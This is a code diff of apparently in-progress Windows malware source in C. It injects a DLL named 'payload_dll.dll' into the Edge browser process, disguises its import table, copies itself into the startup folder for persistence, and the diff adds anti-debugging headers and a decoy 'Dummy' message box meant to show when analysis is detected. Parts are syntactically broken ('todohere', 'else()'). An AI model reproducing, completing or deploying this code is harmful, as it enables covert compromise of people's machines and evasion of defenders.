@@ -1,8 +1,16 @@
 #include <stdio.h>
 #include <Windows.h>
+#include <Winternl.h>
 #include <tlhelp32.h>
 #include <shlobj.h>
 #include <strsafe.h>
+#include "anti_debug.h"
+#include "drm.h"
+
+//Dummy Payload
+VOID DPayload() {
+	MessageBox(NULL, L"Dummy", L"Dummy", MB_OK);
+}
 
 // Function to move the current running binary to the startup folder
 BOOL MoveToStartup() {
@@ -187,58 +195,65 @@ _EndOfFunction:
 
 int main() {
 
-	// Hardcoded process name
-	wchar_t szProcessName[] = L"msedge.exe";
+	//Anti-Debugging Techniques (to modify)
+	if (todohere) {
 
-	// Get the current location of the binary
-	wchar_t szCurrentPath[MAX_PATH];
-	DWORD length = GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
-	if (length == 0) {
-		printf("[!] GetModuleFileName Failed With Error Code: %d\n", GetLastError());
-		return -1;
-	}
+		// Hardcoded process name
+		wchar_t szProcessName[] = L"msedge.exe";
 
-	// Remove the executable name from the path
-	wchar_t* lastSlash = wcsrchr(szCurrentPath, L'\\');
-	if (lastSlash != NULL) {
-		*lastSlash = L'\0';
-	}
+		// Get the current location of the binary
+		wchar_t szCurrentPath[MAX_PATH];
+		DWORD length = GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
+		if (length == 0) {
+			printf("[!] GetModuleFileName Failed With Error Code: %d\n", GetLastError());
+			return -1;
+		}
 
-	// Append the DLL name to the path
-	wchar_t szDllPath[MAX_PATH];
-	swprintf(szDllPath, MAX_PATH, L"%s\\payload_dll.dll", szCurrentPath);
+		// Remove the executable name from the path
+		wchar_t* lastSlash = wcsrchr(szCurrentPath, L'\\');
+		if (lastSlash != NULL) {
+			*lastSlash = L'\0';
+		}
 
-	DWORD dwProcessID;
-	HANDLE hProcess;
+		// Append the DLL name to the path
+		wchar_t szDllPath[MAX_PATH];
+		swprintf(szDllPath, MAX_PATH, L"%s\\payload_dll.dll", szCurrentPath);
 
-	// Get the handle of the target remote process
-	if (!GetRemoteProcessHandle(szProcessName, &dwProcessID, &hProcess)) {
-		printf("[!] Failed to get handle of the target process\n");
-		return -1;
-	}
+		DWORD dwProcessID;
+		HANDLE hProcess;
 
-	printf("[*] Got handle of the target process with PID: %d\n", dwProcessID);
+		// Get the handle of the target remote process
+		if (!GetRemoteProcessHandle(szProcessName, &dwProcessID, &hProcess)) {
+			printf("[!] Failed to get handle of the target process\n");
+			return -1;
+		}
 
-	// Inject the DLL into the remote process
-	if (!InjectDllToRemoteProcess(hProcess, szDllPath)) {
-		printf("[!] Failed to inject DLL into the target process\n");
+		printf("[*] Got handle of the target process with PID: %d\n", dwProcessID);
+
+		// Inject the DLL into the remote process
+		if (!InjectDllToRemoteProcess(hProcess, szDllPath)) {
+			printf("[!] Failed to inject DLL into the target process\n");
+			CloseHandle(hProcess);
+			return -1;
+		}
+
+		// Camoflage the IAT
+		IATCamoflage2();
+
+		// Move the binary to the startup folder
+		if (!MoveToStartup()) {
+			printf("[!] Failed to move the binary to the startup folder\n");
+			return -1;
+		}
+
+		printf("[+] DLL injected successfully\n");
+
+		// Close the handle to the process
 		CloseHandle(hProcess);
-		return -1;
 	}
-
-	// Camoflage the IAT
-	IATCamoflage2();
-
-	// Move the binary to the startup folder
-	if (!MoveToStartup()) {
-		printf("[!] Failed to move the binary to the startup folder\n");
-		return -1;
+	else() {
+		DPayload();
 	}
-
-	printf("[+] DLL injected successfully\n");
-
-	// Close the handle to the process
-	CloseHandle(hProcess);
 
 	return 0;
 }
